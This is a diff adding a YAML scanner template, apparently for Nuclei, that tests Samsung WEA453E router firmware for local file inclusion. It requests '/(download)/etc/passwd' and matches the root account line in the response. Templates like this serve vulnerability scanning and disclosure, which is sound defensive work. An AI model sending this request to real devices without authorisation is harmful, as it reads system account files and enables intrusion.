@@ -1,0 +1,31 @@
+id: yaml-poc-samsung-wea453e_firmware-file_inclusion-CT-530865
+info:
+  name: Yaml Poc Samsung Wea453E_Firmware File_Inclusion Ct 530865
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-samsung-wea453e_firmware-file_inclusion-CT-530865'
+  tags: lfi
+  reference:
+  - https://ireadyoulearn.info/2020/11/27/exploiting-samsung-router-wlan-ap-wea453e/
+  - https://www.seebug.org/vuldb/ssvid-99075
+http:
+- method: GET
+  path:
+  - /
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /(download)/etc/passwd
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: regex
+    part: body
+    regex:
+    - root:(?P<passwd>.+?):0:0:0:/root:/bin/bash
